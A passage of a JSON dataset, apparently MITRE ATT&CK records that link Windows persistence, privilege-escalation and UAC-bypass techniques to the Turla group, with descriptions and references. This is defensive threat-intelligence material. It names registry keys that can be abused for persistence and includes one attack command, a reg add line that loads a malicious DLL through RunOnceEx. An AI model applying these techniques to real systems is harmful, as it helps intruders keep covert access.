        "description": "Comi, G. (2019, October 19). Abusing Windows 10 Narrator's 'Feedback-Hub' URI for Fileless Persistence. Retrieved April 28, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3",
    "platform": "windows",
    "tid": "T1546.013",
    "technique": "PowerShell Profile",
    "tactic": "persistence",
    "datasources": "command-execution|file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
    "technique_references": [
      {
        "source_name": "Microsoft About Profiles",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6",
        "description": "Microsoft. (2017, November 29). About Profiles. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Turla PowerShell May 2019",
        "url": "https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/",
        "description": "Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wits End and Shady PowerShell Profiles",
        "url": "https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html",
        "description": "DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege Elevation using the Powershell Profile. Retrieved July 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Profiles",
        "url": "https://docs.microsoft.com/powershell/module/microsoft.powershell.core/about/about_profiles",
        "description": "Microsoft. (2021, September 27). about_Profiles. Retrieved February 4, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3",
    "platform": "windows",
    "tid": "T1546.013",
    "technique": "PowerShell Profile",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
    "technique_references": [
      {
        "source_name": "Microsoft About Profiles",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6",
        "description": "Microsoft. (2017, November 29). About Profiles. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Turla PowerShell May 2019",
        "url": "https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/",
        "description": "Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wits End and Shady PowerShell Profiles",
        "url": "https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html",
        "description": "DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege Elevation using the Powershell Profile. Retrieved July 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Profiles",
        "url": "https://docs.microsoft.com/powershell/module/microsoft.powershell.core/about/about_profiles",
        "description": "Microsoft. (2021, September 27). about_Profiles. Retrieved February 4, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
    "platform": "windows",
    "tid": "T1547.001",
    "technique": "Registry Run Keys / Startup Folder",
    "tactic": "persistence",
    "datasources": "command-execution|file-modification|process-creation|windows-registry-key-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer|kazuar|mosquito",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
    "technique_references": [
      {
        "source_name": "Malwarebytes Wow6432Node 2016",
        "url": "https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/",
        "description": "Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Wow6432Node 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry",
        "description": "Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Run Key",
        "url": "http://msdn.microsoft.com/en-us/library/aa376977",
        "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe RunOnceEx Mar 2018",
        "url": "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/",
        "description": "Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/270.html",
        "description": "none",
        "external_id": "CAPEC-270"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
    "platform": "windows",
    "tid": "T1547.001",
    "technique": "Registry Run Keys / Startup Folder",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|file-modification|process-creation|windows-registry-key-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer|kazuar|mosquito",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
    "technique_references": [
      {
        "source_name": "Malwarebytes Wow6432Node 2016",
        "url": "https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/",
        "description": "Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Wow6432Node 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry",
        "description": "Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Run Key",
        "url": "http://msdn.microsoft.com/en-us/library/aa376977",
        "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe RunOnceEx Mar 2018",
        "url": "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/",
        "description": "Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/270.html",
        "description": "none",
        "external_id": "CAPEC-270"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
    "platform": "windows",
    "tid": "T1547.004",
    "technique": "Winlogon Helper DLL",
    "tactic": "persistence",
    "datasources": "command-execution|module-load|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
    "technique_references": [
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/579.html",
        "description": "none",
        "external_id": "CAPEC-579"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
    "platform": "windows",
    "tid": "T1547.004",
    "technique": "Winlogon Helper DLL",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|module-load|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
    "technique_references": [
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/579.html",
        "description": "none",
        "external_id": "CAPEC-579"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179",
    "platform": "windows",
    "tid": "T1547.009",
    "technique": "Shortcut Modification",
    "tactic": "persistence",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer|kazuar",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/132.html",
        "description": "none",
        "external_id": "CAPEC-132"
      },
      {
        "source_name": "BSidesSLC 2020 - LNK Elastic",
        "url": "https://www.youtube.com/watch?v=nJ0UsyiUEqQ",
        "description": "French, D., Filar, B.. (2020, March 21). A Chain Is No Stronger Than Its Weakest LNK. Retrieved November 30, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179",
    "platform": "windows",
    "tid": "T1547.009",
    "technique": "Shortcut Modification",
    "tactic": "privilege-escalation",
    "datasources": "file-creation|file-modification|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer|kazuar",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/132.html",
        "description": "none",
        "external_id": "CAPEC-132"
      },
      {
        "source_name": "BSidesSLC 2020 - LNK Elastic",
        "url": "https://www.youtube.com/watch?v=nJ0UsyiUEqQ",
        "description": "French, D., Filar, B.. (2020, March 21). A Chain Is No Stronger Than Its Weakest LNK. Retrieved November 30, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
    "platform": "windows",
    "tid": "T1548.002",
    "technique": "Bypass User Account Control",
    "tactic": "defense-evasion",
    "datasources": "command-execution|process-creation|process-metadata|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
    "technique_references": [
      {
        "source_name": "Davidson Windows",
        "url": "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html",
        "description": "Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet How UAC Works",
        "url": "https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works",
        "description": "Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SANS UAC Bypass",
        "url": "http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass",
        "description": "Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN COM Elevation",
        "url": "https://msdn.microsoft.com/en-us/library/ms679687.aspx",
        "description": "Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "enigma0x3 Fileless UAC Bypass",
